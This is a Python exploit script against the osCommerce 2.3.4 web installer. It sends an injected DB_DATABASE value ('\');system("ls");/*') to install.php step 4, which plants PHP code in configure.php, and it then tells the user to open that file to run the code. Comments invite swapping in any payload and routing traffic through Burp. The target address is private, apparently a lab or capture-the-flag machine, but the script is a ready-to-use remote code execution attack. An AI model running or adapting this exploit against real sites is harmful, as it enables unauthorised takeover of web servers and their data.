##Make sure the OsCommerce website is running version 2.3.4 or 2.3.4.1
##Turn on Burp, put the listener on port 6969, and change the domain of base_url and target_url
##Have fun

import requests

base_url = "http://10.10.37.152:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.37.152:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
        'DIR_FS_DOCUMENT_ROOT' : './'
       }

proxy = {
        'http' : "http://localhost:6969"
        }

payload = '\');'
payload += 'system("ls");' #Modify this with your payload
payload += '/*'

print("[+] Using Payload : " + payload)
for key,value in proxy.items():
    print("[+] Using Proxy : " + "[" + str(key) + "] " + str(value))
data['DB_DATABASE'] = payload

r = requests.post(url=target_url, data=data, proxies=proxy)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned !")

